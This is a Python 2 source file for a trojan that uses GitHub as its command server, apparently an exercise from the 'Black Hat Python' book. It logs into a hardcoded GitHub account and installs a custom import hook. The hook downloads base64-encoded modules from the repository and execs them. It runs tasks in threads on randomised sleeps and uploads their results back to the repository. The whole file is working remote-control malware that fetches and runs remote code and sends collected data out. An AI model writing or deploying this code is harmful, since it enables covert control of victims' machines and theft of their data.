from github3 import login
import base64
import json
import sys
import random
import Queue
import threading
import time
import imp

trojan_id = "abc"
trojan_config = "%s.json" % trojan_id

data_path = "/data/%s/" % trojan_id

trojan_modules = []
configured = False

task_queue = Queue.Queue()


def connect_to_github():
    gh = login(username="h0w1in9", password="*********")
    repo = gh.repository("h0w1in9", "black_hat_python")

    branch = repo.branch("master")

    return gh, repo, branch


def get_file_contents(filepath):
    gh, repo, branch = connect_to_github()

    tree = branch.commit.commit.tree.to_tree().recurse()

    for filename in tree.tree:
        if filepath in filename.path:
            print "[*] Found file: %s" % filepath
            blob = repo.blob(filename._json_data["sha"])
            return blob.content

    return None


def get_trojan_config():
    global configured

    config_json = get_file_contents(trojan_config)

    config = json.loads(base64.b64decode(config_json))

    configured = True

    for task in config:
        if task["module"] not in sys.modules:
            print "[*] import module: %s" % task["module"]
            exec("import %s" % task["module"])

    return config


def store_module_result(data):
    gh, repo, branch = connect_to_github()

    remote_path = "chapter7/data/%s/%d.data" % (trojan_id, random.randint(1000, 100000))

    repo.create_file(remote_path, "Commit message", base64.b64encode(data))
    return


class GitImporter(object):
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, fullname, path=None):
        if configured:
            print "[*] Attempting to retrieve: %s" % fullname

            new_binary = get_file_contents("chapter7/modules/%s" % fullname)

            if new_binary is not None:
                self.current_module_code = base64.b64decode(new_binary)
                return self

        return None

    def load_module(self, name):
        module = imp.new_module(name)
        exec self.current_module_code in module.__dict__
        sys.modules[name] = module
        return module


def module_runner(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()

    print result
    # store the result in our repo
    store_module_result(result)
    return


# main trojan loop
sys.meta_path = [GitImporter()]

while True:
    if task_queue.empty():
        config = get_trojan_config()
        for task in config:
            t = threading.Thread(target=module_runner, args=(task["module"],))
            t.start()
            time.sleep(random.randint(1, 10))

    time.sleep(random.randint(1000, 10000))
